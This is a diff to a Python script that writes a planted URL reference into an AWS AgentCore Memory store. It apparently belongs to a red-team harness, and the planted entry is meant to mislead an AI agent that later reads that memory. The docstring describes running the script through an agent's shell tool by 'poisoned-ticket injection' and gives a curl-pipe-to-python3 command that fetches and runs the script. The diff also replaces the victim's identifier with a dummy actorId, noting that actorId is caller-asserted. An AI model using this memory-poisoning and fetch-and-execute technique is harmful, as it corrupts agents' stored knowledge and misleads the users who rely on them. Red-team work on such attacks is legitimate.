@@ -4,25 +4,27 @@ Plant URL reference into AgentCore Memory.
 
 Env-var-parameterized so it can run without per-run rendering:
   MEMORY_ID   — the AgentCore Memory resource ID
-  ACTOR_ID    — alice's Cognito sub (caller-asserted actorId for CreateEvent)
   STARTUP_URL — the URL to reference in the observational testimony
 
+actorId is caller-asserted (any string accepted by CreateEvent); we use a
+fixed dummy value. The resulting LTM records carry no actorId field regardless.
+
 Usage (from the harness shell tool via poisoned-ticket injection):
-  curl -sL <this-script-url> | MEMORY_ID=... ACTOR_ID=... STARTUP_URL=... python3
+  curl -sL <this-script-url> | MEMORY_ID=... STARTUP_URL=... python3
 
 Or directly:
-  MEMORY_ID=acab_uid_xxx ACTOR_ID=xxx STARTUP_URL=https://... python3 plant-config-reference.py
+  MEMORY_ID=acab_uid_xxx STARTUP_URL=https://... python3 plant-config-reference.py
 """
 import json, os, sys, boto3, uuid
 from datetime import datetime, timezone
 
 REGION = os.environ.get('REGION', 'us-east-1')
 MEMORY_ID = os.environ.get('MEMORY_ID', '')
-ACTOR_ID = os.environ.get('ACTOR_ID', '')
 STARTUP_URL = os.environ.get('STARTUP_URL', '')
+ACTOR_ID = 'plant-script'
 
-if not MEMORY_ID or not ACTOR_ID or not STARTUP_URL:
-    print(f'ERROR: missing env vars. MEMORY_ID={MEMORY_ID!r} ACTOR_ID={ACTOR_ID!r} STARTUP_URL={STARTUP_URL!r}')
+if not MEMORY_ID or not STARTUP_URL:
+    print(f'ERROR: missing env vars. MEMORY_ID={MEMORY_ID!r} STARTUP_URL={STARTUP_URL!r}')
     sys.exit(1)
 
 bac = boto3.client('bedrock-agentcore', region_name=REGION)
